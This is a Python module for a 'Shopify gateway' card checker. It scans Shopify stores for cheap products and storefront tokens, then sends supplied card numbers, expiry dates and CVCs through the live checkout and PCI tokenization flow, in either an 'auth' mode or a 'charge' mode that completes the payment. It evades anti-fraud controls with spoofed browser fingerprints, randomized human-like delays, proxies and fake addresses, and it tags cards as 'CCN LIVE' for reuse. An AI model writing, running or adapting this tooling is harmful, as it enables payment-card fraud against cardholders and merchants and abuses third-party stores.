"""
Shopify Full Gateway - Complete checkout flow with product tracking
Supports both Auth (validate) and Charge (complete payment) modes
Shows product name and price for each store

Enhanced with:
- Browser fingerprinting for consistent sessions
- Human-like timing with Gaussian delays
- Smart BIN-based store routing
- Session caching for faster checks
- Retry logic with exponential backoff
- Parallel fallback on failures
"""

import asyncio
import httpx
import random
import time
import json
from typing import Tuple, Optional, Dict, List
from dataclasses import dataclass, field
from urllib.parse import urlparse

from tools.bin_lookup import get_card_info

from gates.fingerprint import (
    generate_fingerprint,
    GaussianTimer,
    get_session_for_domain,
    simulate_browsing_behavior,
    BrowserFingerprint,
)

from gates.smart_routing import (
    get_best_store_for_card,
    record_bin_result,
    filter_stores_by_price,
    get_fallback_stores,
    should_try_fallback,
    record_store_failure,
    record_store_success,
)

from gates.retry_logic import (
    async_retry_with_backoff,
    get_response_confidence,
    should_retry_on_response,
    RetryConfig,
    classify_failure,
    FailureType,
)

from gates.health_check import (
    get_cached_session,
    cache_checkout_session,
    add_store_to_health_check,
    CachedSession,
    prewarm_stores,
)

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "EUR": "DE",
    "AUD": "AU", "NZD": "NZ", "JPY": "JP",
}

ADDRESSES = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198", "currencyCode": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "GBP"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567", "currencyCode": "AUD"},
    "DE": {"address1": "Alexanderplatz 1", "city": "Berlin", "postalCode": "10178", "zoneCode": "BE", "countryCode": "DE", "phone": "301234567", "currencyCode": "EUR"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.120 Safari/537.36",
]


@dataclass
class StoreProduct:
    """Product info cached for a store"""
    variant_id: str
    product_title: str
    price: float
    currency: str = "USD"
    sku: str = ""
    available: bool = True


@dataclass 
class StoreInfo:
    """Complete store information with product and stats"""
    url: str
    domain: str = ""
    storefront_token: Optional[str] = None
    product: Optional[StoreProduct] = None
    total_checks: int = 0
    successes: int = 0
    failures: int = 0
    last_check: float = 0.0
    last_error: str = ""
    is_working: bool = True
    
    def __post_init__(self):
        if not self.domain:
            parsed = urlparse(self.url)
            self.domain = parsed.netloc or self.url
    
    @property
    def success_rate(self) -> float:
        if self.total_checks == 0:
            return 0.5
        return self.successes / self.total_checks
    
    @property
    def product_display(self) -> str:
        """Human-readable product info"""
        if not self.product:
            return "No product found"
        p = self.product
        return f"{p.product_title[:30]} - ${p.price:.2f} {p.currency}"
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for display"""
        return {
            "url": self.url,
            "domain": self.domain,
            "product": self.product_display,
            "price": f"${self.product.price:.2f}" if self.product else "N/A",
            "success_rate": f"{self.success_rate * 100:.1f}%",
            "total_checks": self.total_checks,
            "is_working": self.is_working,
            "last_error": self.last_error[:50] if self.last_error else "",
        }


class ShopifyStoreManager:
    """
    Manages Shopify stores with product discovery and stats tracking.
    Shows product name and price for each scanned store.
    Enhanced with smart routing and health check integration.
    """
    
    def __init__(self):
        self._stores: Dict[str, StoreInfo] = {}
        self._scan_timeout = 15
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL to standard format"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = f"https://{url}"
        return url.rstrip('/')
    
    async def scan_store(self, url: str, proxy: Optional[str] = None) -> StoreInfo:
        """
        Scan a store to find products and storefront token.
        Returns StoreInfo with product details.
        """
        url = self._normalize_url(url)
        parsed = urlparse(url)
        domain = parsed.netloc
        
        store = StoreInfo(url=url, domain=domain)
        
        fingerprint = generate_fingerprint()
        
        proxies = None
        if proxy:
            try:
                parts = proxy.split(':')
                if len(parts) == 4:
                    proxies = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    proxies = f"http://{parts[0]}:{parts[1]}"
            except Exception:
                pass
        
        try:
            async with httpx.AsyncClient(
                proxies=proxies, 
                timeout=self._scan_timeout, 
                follow_redirects=True, 
                verify=False
            ) as client:
                headers = fingerprint.to_headers()
                
                resp = await client.get(f"{url}/products.json?limit=100", headers=headers)
                
                if resp.status_code != 200:
                    store.is_working = False
                    store.last_error = f"Products API returned {resp.status_code}"
                    return store
                
                try:
                    data = resp.json()
                except json.JSONDecodeError:
                    store.is_working = False
                    store.last_error = "Invalid JSON from products API"
                    return store
                
                products = data.get('products', [])
                if not products:
                    store.is_working = False
                    store.last_error = "No products found"
                    return store
                
                cheapest = None
                cheapest_price = float('inf')
                
                for product in products:
                    title = product.get('title', 'Unknown')
                    variants = product.get('variants', [])
                    
                    for variant in variants:
                        if not variant.get('available', False):
                            continue
                        
                        try:
                            price = float(variant.get('price', '0'))
                        except (ValueError, TypeError):
                            continue
                        
                        if 0 < price < cheapest_price:
                            cheapest_price = price
                            cheapest = StoreProduct(
                                variant_id=str(variant.get('id')),
                                product_title=title,
                                price=price,
                                sku=variant.get('sku', ''),
                            )
                
                if not cheapest:
                    store.is_working = False
                    store.last_error = "No available products with price > 0"
                    return store
                
                store.product = cheapest
                
                await GaussianTimer.async_sleep(mean=0.3, std_dev=0.1)
                
                resp = await client.get(url, headers=headers)
                token = self._extract_token(resp.text)
                if token:
                    store.storefront_token = token
                    
                    cached = CachedSession(
                        store_domain=domain,
                        storefront_token=token,
                        product_id=cheapest.variant_id,
                        product_price=cheapest.price,
                    )
                    cache_checkout_session(cached)
                
                store.is_working = True
                store.last_check = time.time()
                
                add_store_to_health_check(domain)
                
        except httpx.TimeoutException:
            store.is_working = False
            store.last_error = "Timeout"
        except Exception as e:
            store.is_working = False
            store.last_error = str(e)[:50]
        
        return store
    
    def _extract_token(self, html: str) -> Optional[str]:
        """Extract storefront access token from page HTML"""
        import re
        patterns = [
            r'"accessToken":"([^"]+)"',
            r"accessToken['\"]:\s*['\"]([^'\"]+)['\"]",
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None
    
    async def add_store(self, url: str, proxy: Optional[str] = None) -> Tuple[bool, str]:
        """
        Add a store after scanning it.
        Returns (success, message with product info)
        """
        store = await self.scan_store(url, proxy)
        
        if store.is_working and store.product:
            self._stores[store.domain] = store
            add_store_to_health_check(store.domain)
            return (True, f"Added: {store.domain} | {store.product_display}")
        else:
            return (False, f"Failed: {store.domain} | {store.last_error}")
    
    async def add_stores_bulk(
        self, 
        urls: List[str], 
        proxy: Optional[str] = None,
        max_concurrent: int = 10,
        callback=None
    ) -> Tuple[int, int, List[str]]:
        """
        Scan and add multiple stores concurrently.
        
        Returns:
            (success_count, fail_count, list of result messages)
        """
        semaphore = asyncio.Semaphore(max_concurrent)
        results = []
        success_count = 0
        fail_count = 0
        
        async def scan_one(url: str) -> str:
            nonlocal success_count, fail_count
            async with semaphore:
                await GaussianTimer.async_sleep(mean=0.2, std_dev=0.1, min_val=0.05)
                success, msg = await self.add_store(url, proxy)
                if success:
                    success_count += 1
                else:
                    fail_count += 1
                if callback:
                    callback(success, msg)
                return msg
        
        tasks = [scan_one(url) for url in urls]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        messages = []
        for r in results:
            if isinstance(r, Exception):
                messages.append(f"Error: {str(r)[:50]}")
                fail_count += 1
            else:
                messages.append(r)
        
        return (success_count, fail_count, messages)
    
    def get_store(self, domain: str = None) -> Optional[StoreInfo]:
        """Get a specific store or the best available one"""
        if domain and domain in self._stores:
            return self._stores[domain]
        
        working = [s for s in self._stores.values() if s.is_working and s.product]
        if not working:
            return None
        
        weights = [max(s.success_rate, 0.1) for s in working]
        return random.choices(working, weights=weights)[0]
    
    def get_store_for_card(self, card_num: str, min_price: float = 1.0, max_price: float = 100.0) -> Optional[StoreInfo]:
        """Get optimal store for a specific card using smart routing"""
        working = [s for s in self._stores.values() if s.is_working and s.product]
        if not working:
            return None
        
        store_dicts = [
            {"domain": s.domain, "price": s.product.price if s.product else 0}
            for s in working
        ]
        filtered = filter_stores_by_price(store_dicts, min_price, max_price)
        
        if not filtered:
            filtered = store_dicts
        
        available_domains = [s["domain"] for s in filtered]
        
        best_domain = get_best_store_for_card(card_num, available_domains)
        
        if best_domain and best_domain in self._stores:
            return self._stores[best_domain]
        
        return self.get_store()
    
    def get_all_stores(self) -> List[Dict]:
        """Get all stores with their product info"""
        return [s.to_dict() for s in self._stores.values()]
    
    def get_working_stores(self) -> List[Dict]:
        """Get only working stores with products"""
        return [s.to_dict() for s in self._stores.values() if s.is_working and s.product]
    
    def get_working_domains(self) -> List[str]:
        """Get list of working store domains"""
        return [s.domain for s in self._stores.values() if s.is_working and s.product]
    
    def record_success(self, domain: str) -> None:
        """Record successful check for a store"""
        if domain in self._stores:
            self._stores[domain].successes += 1
            self._stores[domain].total_checks += 1
            self._stores[domain].last_check = time.time()
            record_store_success(domain)
    
    def record_failure(self, domain: str, error: str = "") -> None:
        """Record failed check for a store"""
        if domain in self._stores:
            self._stores[domain].failures += 1
            self._stores[domain].total_checks += 1
            self._stores[domain].last_check = time.time()
            if error:
                self._stores[domain].last_error = error
            if self._stores[domain].success_rate < 0.1 and self._stores[domain].total_checks >= 5:
                self._stores[domain].is_working = False
            record_store_failure(domain)
    
    def clear_stores(self) -> int:
        """Clear all stores, returns count removed"""
        count = len(self._stores)
        self._stores.clear()
        return count
    
    def remove_dead_stores(self) -> int:
        """Remove non-working stores, returns count removed"""
        dead = [d for d, s in self._stores.items() if not s.is_working]
        for d in dead:
            del self._stores[d]
        return len(dead)


_store_manager = ShopifyStoreManager()


def _capture(data: str, first: str, last: str) -> Optional[str]:
    """Extract text between two markers"""
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def _pick_addr(url: str, cc: str = None, rc: str = None) -> Dict:
    """Pick appropriate address based on store location"""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tld = dom.split('.')[-1].upper()
    
    if tld in ADDRESSES:
        return ADDRESSES[tld]
    ccn = C2C.get(cc)
    if rc in ADDRESSES and ccn == rc:
        return ADDRESSES[rc]
    elif rc in ADDRESSES:
        return ADDRESSES[rc]
    return ADDRESSES["DEFAULT"]


async def shopify_auth_check(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
    store_domain: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Shopify Auth Gate - Validates card without completing charge.
    Goes through full checkout flow but uses a $0.00 auth test.
    
    Returns: (status_message, proxy_alive)
    """
    return await _shopify_check(
        card_num, card_mon, card_yer, card_cvc,
        proxy=proxy,
        store_domain=store_domain,
        mode="auth"
    )


async def shopify_charge_check(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
    store_domain: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Shopify Charge Gate - Completes full payment.
    Actually charges the card for the product price.
    
    Returns: (status_message, proxy_alive)
    """
    return await _shopify_check(
        card_num, card_mon, card_yer, card_cvc,
        proxy=proxy,
        store_domain=store_domain,
        mode="charge"
    )


async def _shopify_check(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
    store_domain: Optional[str] = None,
    mode: str = "auth",
) -> Tuple[str, bool]:
    """
    Internal Shopify check - handles both auth and charge modes.
    Enhanced with fingerprinting, smart routing, session caching, and retry logic.
    
    Mode:
    - "auth": Validates card through checkout flow without completing
    - "charge": Completes the full payment
    """
    proxy_alive = False
    start_time = time.time()
    
    bin_info = get_card_info(card_num)
    bin_display = f" | {bin_info.get('formatted', '')}" if bin_info.get('brand') != 'Unknown' else ""
    
    if store_domain:
        store = _store_manager.get_store(store_domain)
    else:
        store = _store_manager.get_store_for_card(card_num)
    
    if not store or not store.product:
        return ("Error: No working store available. Use /shopify_scan first", False)
    
    domain = store.domain
    base_url = store.url
    product_id = store.product.variant_id
    price = store.product.price
    product_name = store.product.product_title[:25]
    
    session_data = get_session_for_domain(domain)
    fingerprint = session_data.get("fingerprint")
    if not fingerprint:
        fingerprint = generate_fingerprint()
    
    simulate_browsing_behavior(domain)
    
    email = f"test{random.randint(1000,9999)}@gmail.com"
    
    proxies = None
    if proxy:
        try:
            parts = proxy.split(':')
            if len(parts) == 4:
                proxies = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                proxies = f"http://{parts[0]}:{parts[1]}"
        except Exception:
            pass
    
    async def _do_check() -> Tuple[str, bool]:
        nonlocal proxy_alive
        
        try:
            async with httpx.AsyncClient(
                proxies=proxies, 
                timeout=30, 
                follow_redirects=True, 
                verify=False
            ) as session:
                headers = fingerprint.to_headers()
                headers.update(fingerprint.get_client_hints())
                
                cached_session = get_cached_session(domain)
                site_key = None
                
                if cached_session and cached_session.is_valid and cached_session.storefront_token:
                    site_key = cached_session.storefront_token
                elif store.storefront_token:
                    site_key = store.storefront_token
                else:
                    await GaussianTimer.async_sleep(mean=0.3, std_dev=0.1)
                    resp = await session.get(base_url, headers=headers)
                    site_key = _capture(resp.text, '"accessToken":"', '"')
                    
                    if site_key:
                        cached = CachedSession(
                            store_domain=domain,
                            storefront_token=site_key,
                            product_id=product_id,
                            product_price=price,
                        )
                        cache_checkout_session(cached)
                        store.storefront_token = site_key
                
                if not site_key:
                    _store_manager.record_failure(domain, "No storefront token")
                    record_bin_result(card_num, domain, False, "no_token")
                    return (f"Error: No storefront token | {domain}", False)
                
                proxy_alive = True
                
                headers = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': base_url,
                    'user-agent': fingerprint.user_agent,
                    'x-shopify-storefront-access-token': site_key,
                }
                headers.update(fingerprint.get_client_hints())
                
                cart_mutation = {
                    'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode)@inContext(country:$country language:$language){result:cartCreate(input:$input){cart{id checkoutUrl}errors:userErrors{message field code}}}',
                    'variables': {
                        'input': {
                            'lines': [{'merchandiseId': f'gid://shopify/ProductVariant/{product_id}', 'quantity': 1}],
                            'discountCodes': [],
                        },
                        'country': 'US',
                        'language': 'EN',
                    },
                }
                
                await GaussianTimer.async_sleep(mean=0.5, std_dev=0.2)
                
                resp = await session.post(f'{base_url}/api/unstable/graphql.json', headers=headers, json=cart_mutation)
                resp_data = resp.json()
                
                checkout_url = resp_data.get("data", {}).get("result", {}).get("cart", {}).get("checkoutUrl")
                if not checkout_url:
                    _store_manager.record_failure(domain, "Cart creation failed")
                    record_bin_result(card_num, domain, False, "cart_failed")
                    return (f"Error: Cart creation failed | {domain}", proxy_alive)
                
                await GaussianTimer.async_sleep(mean=0.8, std_dev=0.3)
                
                checkout_headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'user-agent': fingerprint.user_agent,
                }
                checkout_headers.update(fingerprint.get_client_hints())
                
                resp = await session.get(checkout_url, headers=checkout_headers, params={'auto_redirect': 'false'})
                
                paymentMethodIdentifier = _capture(resp.text, "paymentMethodIdentifier&quot;:&quot;", "&quot")
                stable_id = _capture(resp.text, "stableId&quot;:&quot;", "&quot")
                queue_token = _capture(resp.text, "queueToken&quot;:&quot;", "&quot")
                currencyCode = _capture(resp.text, "currencyCode&quot;:&quot;", "&quot") or "USD"
                countryCode = _capture(resp.text, "countryCode&quot;:&quot;", "&quot") or "US"
                x_checkout_session_token = _capture(resp.text, 'serialized-session-token" content="&quot;', '&quot')
                source_token = _capture(resp.text, 'serialized-source-token" content="&quot;', '&quot')
                
                if not x_checkout_session_token or not stable_id:
                    _store_manager.record_failure(domain, "Checkout page parse failed")
                    record_bin_result(card_num, domain, False, "checkout_parse_failed")
                    return (f"Error: Checkout parse failed | {domain}", proxy_alive)
                
                cached = CachedSession(
                    store_domain=domain,
                    storefront_token=site_key,
                    checkout_token=x_checkout_session_token,
                    checkout_url=checkout_url,
                    product_id=product_id,
                    product_price=price,
                )
                cache_checkout_session(cached)
                
                await GaussianTimer.async_sleep(mean=0.4, std_dev=0.15)
                
                pci_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://checkout.pci.shopifyinc.com',
                    'user-agent': fingerprint.user_agent,
                }
                
                year_full = int(card_yer) if len(card_yer) == 4 else int(f"20{card_yer}")
                
                card_data = {
                    'credit_card': {
                        'number': card_num,
                        'month': int(card_mon),
                        'year': year_full,
                        'verification_value': card_cvc,
                        'name': 'John Doe',
                    },
                    'payment_session_scope': domain,
                }
                
                resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pci_headers, json=card_data)
                
                if resp.status_code != 200:
                    resp_text = resp.text.lower()
                    if "invalid" in resp_text or "number" in resp_text:
                        _store_manager.record_success(domain)
                        record_bin_result(card_num, domain, True, "invalid_card")
                        return (f"❌ INVALID CARD{bin_display} | {domain}", proxy_alive)
                    _store_manager.record_failure(domain, "Card tokenization failed")
                    record_bin_result(card_num, domain, False, "tokenization_failed")
                    return (f"Error: Card tokenization failed | {domain}", proxy_alive)
                
                session_id = resp.json().get("id")
                if not session_id:
                    _store_manager.record_failure(domain, "No session ID")
                    record_bin_result(card_num, domain, False, "no_session_id")
                    return (f"Error: No session ID | {domain}", proxy_alive)
                
                addr = _pick_addr(base_url, cc=currencyCode, rc=countryCode)
                
                submit_price = str(price) if mode == "charge" else "0.00"
                
                await GaussianTimer.async_sleep(mean=0.6, std_dev=0.2)
                
                submit_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': base_url,
                    'user-agent': fingerprint.user_agent,
                    'x-checkout-one-session-token': x_checkout_session_token,
                    'x-checkout-web-source-id': source_token,
                    'shopify-checkout-client': 'checkout-web/1.0',
                }
                submit_headers.update(fingerprint.get_client_hints())
                
                submit_mutation = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{id}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter __typename}__typename}}',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': x_checkout_session_token},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{
                                    'destination': {
                                        'partialStreetAddress': {
                                            'address1': addr["address1"],
                                            'city': addr["city"],
                                            'countryCode': addr["countryCode"],
                                            'postalCode': addr["postalCode"],
                                            'firstName': 'John',
                                            'lastName': 'Doe',
                                            'zoneCode': addr["zoneCode"],
                                            'phone': addr["phone"],
                                        }
                                    },
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                    },
                                    'targetMerchandiseLines': {'any': True},
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                }],
                                'noDeliveryRequired': [],
                                'supportsSplitShipping': True,
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                }],
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': addr["address1"],
                                                    'city': addr["city"],
                                                    'countryCode': addr["countryCode"],
                                                    'postalCode': addr["postalCode"],
                                                    'firstName': 'John',
                                                    'lastName': 'Doe',
                                                    'zoneCode': addr["zoneCode"],
                                                    'phone': addr["phone"],
                                                },
                                            },
                                        },
                                    },
                                    'amount': {'value': {'amount': submit_price, 'currencyCode': currencyCode}},
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': addr["address1"],
                                        'city': addr["city"],
                                        'countryCode': addr["countryCode"],
                                        'postalCode': addr["postalCode"],
                                        'firstName': 'John',
                                        'lastName': 'Doe',
                                        'zoneCode': addr["zoneCode"],
                                        'phone': addr["phone"],
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'email': email,
                                'emailChanged': False,
                            },
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currencyCode}}},
                        },
                        'attemptToken': f'{source_token}-{mode}',
                    },
                }
                
                resp = await session.post(
                    f'{base_url}/api/unstable/graphql.json', 
                    headers=submit_headers, 
                    json=submit_mutation, 
                    params={'operationName': 'SubmitForCompletion'}
                )
                
                elapsed = round(time.time() - start_time, 2)
                result_text = resp.text.lower()
                
                mode_label = "AUTH" if mode == "auth" else "CHARGE"
                price_info = f"${price:.2f}" if mode == "charge" else ""
                
                confidence, conf_level = get_response_confidence(result_text)
                
                if "submitsuccess" in result_text or "receipt" in result_text:
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, "approved")
                    if mode == "charge":
                        return (f"✅ CHARGED {price_info}{bin_display} | {product_name} | {domain} [{elapsed}s]", proxy_alive)
                    else:
                        return (f"✅ {mode_label} APPROVED{bin_display} | {product_name} | {domain} [{elapsed}s]", proxy_alive)
                
                elif "insufficient_funds" in result_text or "insufficient funds" in result_text:
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, "insufficient_funds")
                    return (f"🔵 CCN LIVE - Insufficient Funds{bin_display} | {domain}", proxy_alive)
                
                elif "incorrect_cvc" in result_text or "cvc" in result_text or "cvv" in result_text:
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, "incorrect_cvc")
                    return (f"🔵 CCN LIVE - CVV Mismatch{bin_display} | {domain}", proxy_alive)
                
                elif "3d_secure" in result_text or "authentication" in result_text:
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, "3ds_required")
                    return (f"🔐 CCN LIVE - 3DS Required{bin_display} | {domain}", proxy_alive)
                
                elif "expired" in result_text:
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, "expired")
                    return (f"📅 DECLINED - Card Expired{bin_display} | {domain}", proxy_alive)
                
                elif "fraud" in result_text or "risk" in result_text:
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, "fraud_risk")
                    return (f"⚠️ DECLINED - Fraud Risk{bin_display} | {domain}", proxy_alive)
                
                elif "card_declined" in result_text or "declined" in result_text:
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, "declined")
                    return (f"❌ DECLINED{bin_display} | {domain}", proxy_alive)
                
                else:
                    error_msg = _capture(resp.text, '"nonLocalizedMessage":"', '"') or "Unknown"
                    
                    if should_retry_on_response(result_text):
                        raise Exception(f"Retryable: {error_msg}")
                    
                    _store_manager.record_success(domain)
                    record_bin_result(card_num, domain, True, error_msg[:30])
                    return (f"❌ DECLINED - {error_msg[:40]}{bin_display} | {domain}", proxy_alive)
        
        except httpx.TimeoutException:
            _store_manager.record_failure(domain, "Timeout")
            record_bin_result(card_num, domain, False, "timeout")
            raise Exception("Timeout")
        except Exception as e:
            error_str = str(e)
            if "Retryable" not in error_str:
                _store_manager.record_failure(domain, error_str[:50])
                record_bin_result(card_num, domain, False, error_str[:30])
            raise
    
    retry_config = RetryConfig(
        max_retries=2,
        base_delay=1.0,
        max_delay=5.0,
        jitter=0.3,
    )
    
    try:
        result = await async_retry_with_backoff(
            _do_check,
            config=retry_config,
        )
        return result
    except Exception as e:
        error_str = str(e)
        
        if should_try_fallback(domain, error_str):
            all_domains = _store_manager.get_working_domains()
            fallback_domains = get_fallback_stores(domain, all_domains)
            
            for fallback_domain in fallback_domains[:2]:
                fallback_store = _store_manager.get_store(fallback_domain)
                if fallback_store and fallback_store.is_working:
                    try:
                        return await _shopify_check(
                            card_num, card_mon, card_yer, card_cvc,
                            proxy=proxy,
                            store_domain=fallback_domain,
                            mode=mode,
                        )
                    except Exception:
                        continue
        
        if "timeout" in error_str.lower():
            return (f"⏱️ TIMEOUT | {domain}", False)
        return (f"Error: {error_str[:40]} | {domain}", False)


async def scan_shopify_store(url: str, proxy: Optional[str] = None) -> Tuple[bool, str]:
    """Scan and add a single Shopify store"""
    return await _store_manager.add_store(url, proxy)


async def scan_shopify_stores(
    urls: List[str], 
    proxy: Optional[str] = None,
    max_concurrent: int = 10
) -> Tuple[int, int, List[str]]:
    """Scan and add multiple Shopify stores"""
    return await _store_manager.add_stores_bulk(urls, proxy, max_concurrent)


def get_shopify_stores() -> List[Dict]:
    """Get all scanned stores with product info"""
    return _store_manager.get_all_stores()


def get_working_shopify_stores() -> List[Dict]:
    """Get only working stores with products"""
    return _store_manager.get_working_stores()


def clear_shopify_stores() -> int:
    """Clear all stores"""
    return _store_manager.clear_stores()


def remove_dead_shopify_stores() -> int:
    """Remove non-working stores"""
    return _store_manager.remove_dead_stores()


async def prewarm_shopify_stores(count: int = 3, proxy: Optional[str] = None) -> int:
    """
    Pre-warm store sessions before batch checks.
    Visits stores ahead of time to establish sessions and reduce cold-start failures.
    
    Args:
        count: Number of stores to warm (default 3)
        proxy: Optional proxy
    
    Returns:
        Number of stores successfully warmed
    """
    stores = _store_manager.get_working_stores()
    if not stores:
        return 0
    
    domains = [s["domain"] for s in stores]
    return await prewarm_stores(domains, count, proxy)
